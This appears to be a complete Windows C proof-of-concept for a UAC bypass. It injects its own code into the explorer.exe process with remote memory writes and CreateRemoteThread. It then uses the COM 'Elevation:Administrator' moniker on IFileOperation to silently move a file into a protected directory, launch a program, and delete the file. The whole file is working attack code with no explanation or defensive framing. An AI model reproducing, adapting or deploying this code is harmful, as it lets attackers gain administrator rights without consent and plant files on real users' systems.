#include <windows.h>
#include <shlobj.h>

typedef struct _ELOAD_PARAMETERS {
	TCHAR	SourceFilePathAndName[MAX_PATH];
	TCHAR	DestinationDir[MAX_PATH];
	TCHAR	ExePathAndName[MAX_PATH];
	TCHAR	ExeWorkingDir[MAX_PATH];
	TCHAR	ExeParameters[MAX_PATH];
} ELOAD_PARAMETERS, *PELOAD_PARAMETERS;

static	ELOAD_PARAMETERS	ElevParams;

#pragma optimize("", off)
void _xmemzero(void *p, SIZE_T s)
{
	SIZE_T	i;
			
	for (i = 0; i < s; i++)
		((char *)p)[i] = 0;
}
#pragma optimize("", on)

DWORD WINAPI ElavatedLoadProc(PELOAD_PARAMETERS elvpar)
{
	HRESULT				r;
	BOOL				cond = FALSE;
	IFileOperation		*FileOperation1 = NULL;
	IShellItem			*isrc = NULL, *idst = NULL;
	BIND_OPTS3			bop;
	SHELLEXECUTEINFO	shexec;
	TCHAR				textbuf[MAX_PATH * 2], *p, *f, *f0;

	if (elvpar == NULL)
		return (DWORD)E_FAIL;

	r = CoInitialize(NULL);
	if ( r != S_OK )
		return r;

	_xmemzero(&bop, sizeof(bop));
	_xmemzero(&shexec, sizeof(shexec));

	do {
		r = CoCreateInstance(&CLSID_FileOperation, NULL, CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER, &IID_IFileOperation, &FileOperation1);
		if (r != S_OK)
			break;
		if (FileOperation1 != NULL)
			FileOperation1->lpVtbl->Release(FileOperation1);

		bop.cbStruct = sizeof(bop);
		bop.dwClassContext = CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER | CLSCTX_INPROC_HANDLER;
		r = CoGetObject(TEXT("Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}"), &bop, &IID_IFileOperation, &FileOperation1);
		if (r != S_OK)
			break;
		if (FileOperation1 == NULL) {
			r = E_FAIL;
			break;
		}

		FileOperation1->lpVtbl->SetOperationFlags(FileOperation1, FOF_NOCONFIRMATION | FOF_SILENT | FOFX_SHOWELEVATIONPROMPT | FOFX_NOCOPYHOOKS | FOFX_REQUIREELEVATION);

		r = SHCreateItemFromParsingName(elvpar->SourceFilePathAndName, NULL, &IID_IShellItem, &isrc);
		if (r != S_OK)
			break;
		r = SHCreateItemFromParsingName(elvpar->DestinationDir, NULL, &IID_IShellItem, &idst);
		if (r != S_OK)
			break;

		r = FileOperation1->lpVtbl->MoveItem(FileOperation1, isrc, idst, NULL, NULL);
		if (r != S_OK)
			break;
		r = FileOperation1->lpVtbl->PerformOperations(FileOperation1);
		if (r != S_OK)
			break;
		idst->lpVtbl->Release(idst);
		idst = NULL;
		isrc->lpVtbl->Release(isrc);
		isrc = NULL;

		shexec.cbSize = sizeof(shexec);
		shexec.fMask = SEE_MASK_NOCLOSEPROCESS;
		shexec.nShow = SW_SHOW;
		shexec.lpFile = elvpar->ExePathAndName;
		shexec.lpParameters = elvpar->ExeParameters;
		shexec.lpDirectory = elvpar->ExeWorkingDir;
		if ( ShellExecuteEx(&shexec) )
			if (shexec.hProcess != NULL) {
				WaitForSingleObject(shexec.hProcess, INFINITE);
				CloseHandle(shexec.hProcess);
			}

		f0 = textbuf;
		p = elvpar->DestinationDir;
		while (*p != (TCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		f = elvpar->SourceFilePathAndName;
		p = f;
		while (*f != (TCHAR)0) {
			if (*f == (TCHAR)'\\')
				p = (TCHAR *)f + 1;
			f++;
		}

		while (*p != (TCHAR)0) {
			*f0 = *p;
			f0++;
			p++;
		}
		*f0 = 0;

		r = SHCreateItemFromParsingName(textbuf, NULL, &IID_IShellItem, &idst);
		if (r != S_OK)
			break;
		r = FileOperation1->lpVtbl->DeleteItem(FileOperation1, idst, NULL);
		if (r != S_OK)
			break;
		FileOperation1->lpVtbl->PerformOperations(FileOperation1);
	} while (cond);

	if ( FileOperation1 != NULL )
		FileOperation1->lpVtbl->Release(FileOperation1);
	if (isrc != NULL)
		isrc->lpVtbl->Release(isrc);
	if (idst != NULL)
		idst->lpVtbl->Release(idst);

	CoUninitialize();

	return r;
}

HANDLE GetExplorerHandle()
{
	HWND	hTrayWnd = NULL;
	DWORD	dwProcessId = 0;

	hTrayWnd = FindWindow(TEXT("Shell_TrayWnd"), NULL);
	if (hTrayWnd == NULL)
		return NULL;

	GetWindowThreadProcessId(hTrayWnd, &dwProcessId);
	if (dwProcessId == 0)
		return NULL;

	return OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
}

void main()
{
	HANDLE						expl;
	HINSTANCE					selfmodule = GetModuleHandle(NULL);
	PIMAGE_DOS_HEADER			pdosh = (PIMAGE_DOS_HEADER)selfmodule;
	PIMAGE_FILE_HEADER			fh = (PIMAGE_FILE_HEADER)((char *)pdosh + pdosh->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER64	opth = (PIMAGE_OPTIONAL_HEADER64)((char *)fh + sizeof(IMAGE_FILE_HEADER));
	LPVOID						remotebuffer = NULL, newEp, newDp;
	SIZE_T						wr = 0;
	DWORD						TId;
	BOOL						cond = FALSE;

	lstrcpy(ElevParams.SourceFilePathAndName, TEXT("C:\\WH\\1.txt"));
	lstrcpy(ElevParams.DestinationDir, TEXT("c:\\WH\\trusted-dll\\"));
	lstrcpy(ElevParams.ExePathAndName, TEXT("c:\\systools\\depends.exe"));
	lstrcpy(ElevParams.ExeWorkingDir, TEXT("c:\\systools\\"));
	lstrcpy(ElevParams.ExeParameters, TEXT("tcpview.exe"));

	expl = GetExplorerHandle();
	if (expl == NULL)
		return;

	do {
		remotebuffer = VirtualAllocEx(expl, NULL, opth->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (remotebuffer == NULL)
			break;

		if (!WriteProcessMemory(expl, remotebuffer, selfmodule, opth->SizeOfImage, &wr))
			break;

		newEp = (char *)remotebuffer + ((char *)&ElavatedLoadProc - (char *)selfmodule);
		newDp = (char *)remotebuffer + ((char *)&ElevParams - (char *)selfmodule);

		CreateRemoteThread(expl, NULL, 0, newEp, newDp, 0, &TId);
	} while (cond);

	CloseHandle(expl);
	ExitProcess(0);
}
